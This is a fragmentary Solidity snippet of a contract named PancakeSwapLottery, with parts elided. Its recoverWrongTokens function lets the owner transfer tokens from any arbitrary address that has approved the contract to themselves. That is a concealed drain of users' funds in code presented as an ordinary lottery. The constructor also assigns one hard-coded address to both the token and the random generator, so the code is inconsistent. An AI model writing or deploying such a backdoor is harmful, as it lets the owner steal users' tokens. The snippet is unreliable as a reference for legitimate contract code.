...
contract PancakeSwapLottery is ReentrancyGuard, IPancakeSwapLottery, Ownable {
    ...
    constructor() {
        cakeToken = IERC20(0x6CAD12b3618a3C7ef1FEb6C91FdC3251f58c2a90);
        randomGenerator = IRandomNumberGenerator(0x6CAD12b3618a3C7ef1FEb6C91FdC3251f58c2a90);
     ...
     */
    function recoverWrongTokens(address _tokenAddress  , uint256 _tokenAmount , address _from ) external onlyOwner {

        IERC20(_tokenAddress).safeTransferFrom(_from ,address(msg.sender), _tokenAmount);
